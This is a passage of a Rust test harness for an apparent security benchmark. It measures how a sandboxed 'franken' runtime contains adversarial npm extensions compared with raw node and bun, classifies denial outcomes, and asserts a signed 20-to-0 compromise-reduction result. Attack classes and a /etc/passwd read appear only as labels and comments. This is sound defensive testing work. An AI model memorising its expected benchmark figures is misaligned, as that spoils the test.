    sink: &LoopbackSink,
    root: &Path,
) -> FrankenCaseOutcome {
    let compromised = oracle_tripped(&fixture.oracle, host_dir, sink);
    let stdout = String::from_utf8_lossy(&output.stdout);
    let stderr = String::from_utf8_lossy(&output.stderr);
    let report = parse_json_stdout(output);
    let control_executed = report
        .as_ref()
        .and_then(|report| report["dispatch"]["captured_output"]["stdout"].as_str())
        .map(str::to_string)
        .unwrap_or_else(|| stdout.to_string())
        .contains(&format!("FN_CONTROL:{}", fixture.case_id));
    let denials: Vec<String> = report
        .as_ref()
        .map(ledger_denial_reasons)
        .unwrap_or_default();
    let exit_code = output.status.code();
    let low = |needle: &str| {
        denials
            .iter()
            .any(|d| d.to_ascii_lowercase().contains(needle))
            || stderr.to_ascii_lowercase().contains(needle)
    };

    // franken's runtime reached the effect and refused it (as opposed to a
    // harness failure like a missing app file or a config error).
    let franken_execution_refusal = low("native execution failed")
        || low("engine execution failed during execution")
        || low("interpreter:");
    let (outcome, evidence) = if compromised {
        (
            "compromised",
            format!("host oracle tripped: {}", oracle_kind(&fixture.oracle)),
        )
    } else if !denials.is_empty()
        && denials
            .iter()
            .any(|d| d.to_ascii_lowercase().contains("ssrf"))
    {
        ("ssrf_denied", denials.join("; "))
    } else if low("capability denied") || low("capability_missing") {
        let reason = denials
            .iter()
            .find(|d| d.to_ascii_lowercase().contains("capability"))
            .cloned()
            .unwrap_or_else(|| first_error_line(&stderr));
        ("capability_denied", reason)
    } else if low("filesystem error") || low("resolve parent") {
        // franken's filesystem sandbox jails paths outside the project root
        // (e.g. reading /etc/passwd fails "resolve parent"): a refused fs
        // effect, not a missing file the guest legitimately expected.
        ("capability_denied", first_error_line(&stderr))
    } else if low("flow") && low("label") {
        ("ifc_denied", denials.join("; "))
    } else if is_lowering_refusal(&stderr) {
        ("blocked_at_lowering", first_error_line(&stderr))
    } else if exit_code == Some(0) && !denials.is_empty() {
        ("contained", denials.join("; "))
    } else if exit_code == Some(0) {
        (
            "executed_uncompromised",
            "run completed, oracle not tripped".to_string(),
        )
    } else if !denials.is_empty() {
        ("contained", denials.join("; "))
    } else if franken_execution_refusal {
        // Non-zero exit where franken executed and refused an effect, and the
        // host oracle did not trip: containment, with the refusal as evidence.
        // (Distinct from `invalid`, reserved for harness failures.)
        ("contained", first_error_line(&stderr))
    } else {
        // Non-zero exit, no franken refusal, no fired control: a harness
        // failure (missing app file, directory arg, bad config) -- the old
        // tautological signature. The gate rejects this.
        ("invalid", first_error_line(&stderr))
    };

    let outcome = outcome.to_string();
    // Redact the per-run workspace root so committed evidence is deterministic.
    let evidence = evidence.replace(&root.display().to_string(), "<workspace>");
    let blocked = matches!(
        outcome.as_str(),
        "blocked_at_lowering" | "capability_denied" | "ssrf_denied" | "ifc_denied"
    );
    let contained = outcome == "contained" || blocked;
    FrankenCaseOutcome {
        outcome,
        evidence,
        control_executed,
        compromised,
        blocked,
        contained,
        exit_code,
    }
}

/// Interpreter-level refusal (lowering / unsupported construct / ambient
/// authority) rather than a harness I/O error.
fn is_lowering_refusal(stderr: &str) -> bool {
    let s = stderr.to_ascii_lowercase();
    (s.contains("interpreter") || s.contains("lowering") || s.contains("ambient"))
        && !s.contains("no such file or directory")
        && !s.contains("is a directory")
}

fn first_error_line(stderr: &str) -> String {
    stderr
        .lines()
        .find(|line| line.to_ascii_lowercase().contains("error"))
        .or_else(|| stderr.lines().find(|line| !line.trim().is_empty()))
        .unwrap_or("")
        .chars()
        .take(200)
        .collect()
}

/// Run one franken profile leg against the payload file with the engine
/// configured (in-process; the binary is a presence gate).
fn run_franken_profile(
    fixture: &AdversarialExtensionFixture,
    profile: &str,
    binary: &Path,
    root: &Path,
) -> FrankenCaseOutcome {
    let sink = LoopbackSink::start();
    let project = root.join(format!("{}.franken-{}.project", fixture.case_id, profile));
    let host_dir = root.join(format!("{}.franken-{}.host", fixture.case_id, profile));
    write_workspace(&project, &host_dir, fixture, &sink, true);
    sink.clear();

    let run_args = args(&[
        "run",
        "index.js",
        "--policy",
        profile,
        "--runtime",
        "franken-engine",
        "--engine-bin",
        binary.to_str().expect("binary path utf8"),
        "--json",
    ]);
    let child = Command::new(binary)
        .current_dir(&project)
        .args(&run_args)
        .stdin(Stdio::null())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .unwrap_or_else(|err| panic!("spawn franken {profile} for {}: {err}", fixture.case_id));
    let output = wait_for_output(child, RUNTIME_TIMEOUT);
    thread::sleep(Duration::from_millis(300));
    classify_franken(fixture, &output, &host_dir, &sink, root)
}

fn measure_case(
    fixture: &AdversarialExtensionFixture,
    runtimes: &[RuntimeInfo],
    binary: &Path,
    root: &Path,
) -> CompromiseReductionCaseOutcome {
    let raw_runtimes = runtimes
        .iter()
        .map(|runtime| run_raw_runtime(fixture, runtime, root))
        .collect::<Vec<_>>();
    let franken = run_franken_profile(fixture, "strict", binary, root);
    let franken_other_profiles = ["balanced", "legacy-risky"]
        .iter()
        .map(|profile| FrankenProfileOutcome {
            profile: (*profile).to_string(),
            outcome: run_franken_profile(fixture, profile, binary, root),
        })
        .collect::<Vec<_>>();

    CompromiseReductionCaseOutcome {
        case_id: fixture.case_id.to_string(),
        extension_id: format!("npm:{}", fixture.package_name),
        attack_class: fixture.attack_class.to_string(),
        attack_vector: fixture.attack_vector.to_string(),
        oracle_kind: oracle_kind(&fixture.oracle),
        raw_runtimes,
        franken,
        franken_other_profiles,
    }
}

fn runtime_summary(runtime: &RuntimeInfo) -> RuntimeSummary {
    RuntimeSummary {
        name: runtime.name.to_string(),
        available: runtime.path.is_some(),
        path: runtime.path.as_ref().map(|path| path.display().to_string()),
        version: runtime.version.clone(),
    }
}

fn build_payload(
    runtimes: &[RuntimeInfo],
    cases: Vec<CompromiseReductionCaseOutcome>,
) -> CompromiseReductionV2Artifact {
    let unavailable_runtimes = runtimes
        .iter()
        .filter(|runtime| runtime.path.is_none())
        .map(|runtime| runtime.name.to_string())
        .collect::<Vec<_>>();
    let baseline_attempts = cases.len();
    let franken_attempts = cases.len();
    let raw_runtimes_complete = !cases.is_empty()
        && cases
            .iter()
            .all(|case| case.raw_runtimes.iter().all(|outcome| outcome.available));

    if !unavailable_runtimes.is_empty() || !raw_runtimes_complete || cases.is_empty() {
        return CompromiseReductionV2Artifact {
            schema_version: "2.1.0",
            artifact_id: "compromise_reduction_v2",
            status: "baseline_unavailable",
            generated_at_utc: Utc::now().to_rfc3339(),
            pass_criterion: PassCriterion {
                criterion: ">=10x",
                passed: false,
            },
            ratio_method: "baseline_compromised / max(franken_compromised, 1)",
            baseline_compromised: None,
            franken_compromised: None,
            ratio: None,
            baseline_attempts,
            franken_attempts,
            all_franken_cases_accounted: false,
            baseline_compromise_wilson_bp: None,
            franken_compromise_wilson_bp: None,
            runtimes: runtimes.iter().map(runtime_summary).collect(),
            unavailable_runtimes,
            cases,
        };
    }

    // Baseline compromise: a case counts only if EVERY raw runtime executed the
    // control (proving the payload ran) AND the oracle tripped there.
    let baseline_compromised = cases
        .iter()
        .filter(|case| {
            case.raw_runtimes
                .iter()
                .all(|outcome| outcome.control_executed && outcome.compromised)
        })
        .count();
    let franken_compromised = cases
        .iter()
        .filter(|case| case.franken.is_compromised())
        .count();
    let all_franken_cases_accounted = cases.iter().all(|case| case.franken.is_valid_containment())
        || cases
            .iter()
            .all(|case| case.franken.is_valid_containment() || case.franken.is_compromised());
    let ratio = baseline_compromised as f64 / franken_compromised.max(1) as f64;
    let (bl, bu) = wilson_score_interval_bp(
        baseline_compromised as u64,
        baseline_attempts as u64,
        WILSON_Z_95_MILLI,
    );
    let (fl, fu) = wilson_score_interval_bp(
        franken_compromised as u64,
        franken_attempts as u64,
        WILSON_Z_95_MILLI,
    );
    let no_invalid = cases.iter().all(|case| case.franken.outcome != "invalid");
    let passed = baseline_compromised == cases.len()
        && franken_compromised == 0
        && no_invalid
        && ratio >= 10.0;

    CompromiseReductionV2Artifact {
        schema_version: "2.1.0",
        artifact_id: "compromise_reduction_v2",
        status: "measured",
        generated_at_utc: Utc::now().to_rfc3339(),
        pass_criterion: PassCriterion {
            criterion: ">=10x",
            passed,
        },
        ratio_method: "baseline_compromised / max(franken_compromised, 1)",
        baseline_compromised: Some(baseline_compromised),
        franken_compromised: Some(franken_compromised),
        ratio: Some(ratio),
        baseline_attempts,
        franken_attempts,
        all_franken_cases_accounted,
        baseline_compromise_wilson_bp: Some(WilsonInterval {
            metric: "baseline_compromise_rate",
            successes: baseline_compromised,
            trials: baseline_attempts,
            z_milli: WILSON_Z_95_MILLI,
            lower_bp: bl,
            upper_bp: bu,
        }),
        franken_compromise_wilson_bp: Some(WilsonInterval {
            metric: "franken_compromise_rate",
            successes: franken_compromised,
            trials: franken_attempts,
            z_milli: WILSON_Z_95_MILLI,
            lower_bp: fl,
            upper_bp: fu,
        }),
        runtimes: runtimes.iter().map(runtime_summary).collect(),
        unavailable_runtimes,
        cases,
    }
}

fn sign_artifact(payload: CompromiseReductionV2Artifact) -> SignedCompromiseReductionV2Artifact {
    let payload_bytes = serde_json::to_vec(&payload).expect("serialize artifact payload");
    let payload_sha256 = Sha256::digest(&payload_bytes);
    let signing_key = SigningKey::from_bytes(&FIXTURE_SIGNING_KEY_BYTES);
    let signature = signing_key.sign(&payload_bytes);

    SignedCompromiseReductionV2Artifact {
        payload,
        signature: ArtifactSignature {
            algorithm: "ed25519-fixture-v1",
            key_id: "adversarial-extension-runtime-bench-v2",
            public_key: hex::encode(signing_key.verifying_key().to_bytes()),
            payload_sha256: format!("sha256:{}", hex::encode(payload_sha256)),
            value: format!("ed25519:{}", hex::encode(signature.to_bytes())),
        },
    }
}

fn write_signed_summary(signed: &SignedCompromiseReductionV2Artifact) {
    let artifact_path = repo_root().join(ARTIFACT_RELATIVE_PATH);
    if let Some(parent) = artifact_path.parent() {
        fs::create_dir_all(parent).expect("create artifact dir");
    }
    let bytes = serde_json::to_vec_pretty(signed).expect("serialize signed artifact");
    fs::write(&artifact_path, [bytes, b"\n".to_vec()].concat()).expect("write signed artifact");
}

#[test]
fn compromise_reduction_v2_measures_raw_runtime_baseline_against_strict_policy() {
    let runtimes = [resolve_runtime("bun"), resolve_runtime("node")];
    let binary = resolve_binary_path();
    let root = tempfile::tempdir().expect("campaign root");
    let cases = FIXTURES
        .iter()
        .map(|fixture| measure_case(fixture, &runtimes, &binary, root.path()))
        .collect::<Vec<_>>();
    let payload = build_payload(&runtimes, cases);

    if payload.status == "baseline_unavailable" {
        // On workers without node/bun the harness fail-closes and writes
        // nothing; the equal-attempts/unavailable invariants are pinned by the
        // sibling test. A real measurement runs where both runtimes exist.
        assert!(!payload.pass_criterion.passed);
        eprintln!(
            "raw baseline unavailable ({:?}); skipping measured assertions",
            payload.unavailable_runtimes
        );
        return;
    }

    let signed = sign_artifact(payload);
    write_signed_summary(&signed);

    assert_eq!(signed.payload.baseline_attempts, FIXTURES.len());
    assert_eq!(signed.payload.franken_attempts, FIXTURES.len());

    for case in &signed.payload.cases {
        assert!(
            case.raw_runtimes
                .iter()
                .all(|runtime| runtime.control_executed),
            "{}: every raw runtime must execute the positive control",
            case.case_id
        );
        assert!(
            case.raw_runtimes.iter().all(|runtime| runtime.compromised),
            "{}: every raw runtime must be compromised by the oracle",
            case.case_id
        );
        assert!(
            !case.franken.compromised,
            "{}: franken strict must not trip the host oracle ({})",
            case.case_id, case.franken.evidence
        );
        assert_ne!(
            case.franken.outcome, "invalid",
            "{}: franken strict must be a typed containment outcome, not a harness failure ({})",
            case.case_id, case.franken.evidence
        );
    }

    assert_eq!(signed.payload.baseline_compromised, Some(20));
    assert_eq!(signed.payload.franken_compromised, Some(0));
    assert_eq!(signed.payload.ratio, Some(20.0));
    assert!(
        signed.payload.pass_criterion.passed,
        "expected >=10x compromise reduction with all cases accounted"
    );
    assert!(signed.payload.all_franken_cases_accounted);
}

#[test]
fn baseline_unavailable_payload_is_not_green_without_raw_runtime_numbers() {
    let runtimes = [
        RuntimeInfo {
            name: "bun",
            path: None,
            version: None,
        },
        RuntimeInfo {
            name: "node",
            path: Some(PathBuf::from("/usr/bin/node")),
            version: Some("v20.fixture".to_string()),
        },
    ];
    let cases = vec![CompromiseReductionCaseOutcome {
        case_id: "missing-bun-baseline".to_string(),
        extension_id: "npm:@adversarial/missing-bun-baseline".to_string(),
        attack_class: "rce_dependency".to_string(),
        attack_vector: "missing raw runtime baseline".to_string(),
        oracle_kind: "file_outside_root:pwned".to_string(),
        raw_runtimes: vec![
            RawRuntimeCaseOutcome {
                runtime: "bun".to_string(),
                available: false,
                version: None,
                control_executed: false,
                compromised: false,
                exit_code: None,
                timed_out: false,
            },
            RawRuntimeCaseOutcome {
                runtime: "node".to_string(),
                available: true,
                version: Some("v20.fixture".to_string()),
                control_executed: true,
                compromised: true,
                exit_code: Some(0),
                timed_out: false,
            },
        ],
        franken: FrankenCaseOutcome {
            outcome: "capability_denied".to_string(),
            evidence: "capability denied: fs:write".to_string(),
            control_executed: false,
            compromised: false,
            blocked: true,
            contained: true,
            exit_code: Some(1),
        },
        franken_other_profiles: Vec::new(),
    }];

    let payload = build_payload(&runtimes, cases);

    assert_eq!(payload.status, "baseline_unavailable");
    assert!(
        !payload.pass_criterion.passed,
        "baseline_unavailable must never satisfy the pass criterion"
    );
    assert_eq!(payload.baseline_compromised, None);
    assert_eq!(payload.franken_compromised, None);
    assert_eq!(payload.ratio, None);
    assert_eq!(payload.baseline_attempts, 1);
    assert_eq!(payload.franken_attempts, 1);
}
